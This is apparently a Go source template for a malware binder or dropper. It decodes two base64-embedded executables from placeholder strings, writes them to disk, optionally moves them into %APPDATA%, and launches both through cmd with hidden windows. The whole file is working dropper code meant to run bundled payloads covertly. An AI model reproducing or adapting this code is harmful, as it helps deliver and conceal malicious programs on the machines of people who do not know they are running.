package main

import "os"
import "os/exec"
import "encoding/base64"
import "syscall"





var Binary_1_Name string = //BINARY-1-NAME//
var Binary_2_Name string = //BINARY-2-NAME//

var Binary_1 string = //BINARY-1//
var Binary_2 string = //BINARY-2//

var Hide bool = false

func main() {
	Binary1, _ := os.Create(Binary_1_Name)
	DecodedBinary1,_ := base64.StdEncoding.DecodeString(Binary_1)
	Binary1.WriteString(string(DecodedBinary1))
	Binary1.Close()


	Binary2, _ := os.Create(Binary_2_Name)
	DecodedBinary2,_ := base64.StdEncoding.DecodeString(Binary_2)
	Binary2.WriteString(string(DecodedBinary2))
	Binary2.Close()


	if Hide == true {
		MoveCommand1 := string("move "+Binary_1_Name+" %APPDATA%")
		ExecuteCommand1 := string("%APPDATA%\\"+Binary_1_Name)
    	Move1 := exec.Command("cmd", "/C", MoveCommand1);
    	Move1.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    	Move1.Start()
    	Execute1 := exec.Command("cmd", "/C", ExecuteCommand1);
    	Execute1.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    	Execute1.Start()		//"move "+Binary_2_Name+" %APPDATA%"


		MoveCommand2 := string("move "+Binary_2_Name+" %APPDATA%")
		ExecuteCommand2 := string("%APPDATA%\\"+Binary_2_Name)
    	Move2 := exec.Command("cmd", "/C", MoveCommand2);
    	Move2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    	Move2.Start()
    	Execute2 := exec.Command("cmd", "/C", ExecuteCommand2);
    	Execute2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    	Execute2.Start()

	}else{
	    Execute1 := exec.Command("cmd", "/C", Binary_1_Name);
    	Execute1.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    	Execute1.Start()
    	Execute2 := exec.Command("cmd", "/C", Binary_2_Name);
    	Execute2.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
    	Execute2.Start()
	}


}
